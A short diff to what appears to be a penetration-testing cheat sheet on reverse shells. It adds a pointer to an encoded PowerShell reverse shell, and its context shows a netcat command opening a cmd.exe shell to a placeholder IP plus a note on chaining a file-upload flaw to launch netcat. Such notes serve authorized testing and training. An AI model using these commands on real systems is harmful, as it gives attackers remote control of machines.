@@ -134,6 +134,10 @@ This is a reliable reverse shell from Windows computer. If you can upload a file
 .\nc.exe -nv 192.168.XX.XX 445 -e cmd.exe
 ```
 
+#### Windows
+
+One reliable revshell is the powershell encoded one on revshells.
+
 #### Two-Parter via File Upload Vuln
 
 Upload netcat.exe, then php file that will trigger it.
